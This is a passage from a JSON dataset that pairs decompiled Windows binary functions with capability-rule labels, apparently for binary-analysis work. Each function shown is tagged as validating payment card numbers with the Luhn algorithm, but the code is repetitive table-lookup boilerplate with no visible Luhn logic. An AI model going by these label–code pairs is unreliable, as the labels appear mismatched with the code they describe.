* 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdd4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdd4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdbc = 0x507724;\n        in_stack_fffffdb8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffdbc != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffdbc);\n        fcn.0049e080(in_stack_fffffdb8, in_stack_fffffdbc, arg_10h);\n        return in_stack_fffffdb8;\n    }\n    fcn.0049c600(*(in_stack_fffffdb8 + *(*in_stack_fffffdb8 + -0xc) + 0x14) | 1);\n    return in_stack_fffffdb8;\n}\n",
        "token_count": 4072
    },
    "004a0b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0b40(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffdd4;\n    int32_t in_stack_fffffdd8;\n    int32_t *in_stack_fffffdf0;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075b0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe44 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe44 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe44 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe28 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507700, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe28 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe28 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe0c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50770c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe0c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe0c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdf0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507718, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffdf0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffdf0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffdd8 = 0x507724;\n        in_stack_fffffdd4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507724, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    if (in_stack_fffffdd8 != 0) {\n        arg_10h = sub.msvcrt.dll_strlen(in_stack_fffffdd8);\n        fcn.0049e080(in_stack_fffffdd4, in_stack_fffffdd8, arg_10h);\n        return in_stack_fffffdd4;\n    }\n    fcn.0049c600(*(in_stack_fffffdd4 + *(*in_stack_fffffdd4 + -0xc) + 0x14) | 1);\n    return in_stack_fffffdd4;\n}\n",
        "token_count": 3895
    },
    "004a0ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004a0ba0(int32_t *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint arg_10h;\n    int32_t *in_stack_fffffdf0;\n    int32_t in_stack_fffffdf4;\n    int32_t *in_stack_fffffe0c;\n    int32_t *in_stack_fffffe28;\n    int32_t *in_stack_fffffe44;\n    int32_t *in_stack_fffffe60;\n    int32_t *in_stack_fffffe7c;\n    int32_t *in_stack_fffffe98;\n    int32_t *in_stack_fffffeb4;\n    int32_t *in_stack_fffffed0;\n    int32_t *in_stack_fffffeec;\n    int32_t *in_stack_ffffff08;\n    int32_t *in_stack_ffffff24;\n    int32_t *in_stack_ffffff40;\n    int32_t *in_stack_ffffff5c;\n    int32_t *in_stack_ffffff78;\n    int32_t *in_stack_ffffff94;\n    int32_t *in_stack_ffffffb0;\n    int32_t *in_stack_ffffffcc;\n    int32_t *in_stack_ffffffe8;\n    \n    uVar3 = fcn.00432500();\n    puVar1 = *param_1 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*param_1 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffe8 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffe8 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffe8 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffcc = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffcc + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffcc + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffffb0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075d4, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffffb0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffffb0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff94 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075e0, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff94 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff94 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff78 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075ec, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff78 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff78 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff5c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5075f8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff5c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff5c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff40 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507604, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff40 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff40 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff24 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507624, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff24 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff24 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_ffffff08 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507644, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_ffffff08 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_ffffff08 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeec = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507664, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeec + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeec + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffed0 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x507670, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffed0 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffed0 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffeb4 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50767c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffeb4 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffeb4 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe98 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x50769c, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe98 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe98 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe7c = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076bc, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe7c + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe7c + 4) + uVar3 * 4),  iVar2 == 0)) {\n        fcn.0049e780();\n    }\n    else {\n        in_stack_fffffe60 = 0x506e70;\n        piVar4 = fcn.004a3c60(iVar2, 0x506e70, 0x5076c8, 0);\n        if (piVar4 != NULL) {\n            return piVar4;\n        }\n    }\n    fcn.004a3670();\n    uVar3 = fcn.00432500();\n    puVar1 = *in_stack_fffffe60 + 8;\n    if ((*puVar1 < uVar3 || *puVar1 == uVar3) || (iVar2 = *(*(*in_stack_fffffe60 + 4) + uVar3 * 4),  iVar2 == 0)) {\n        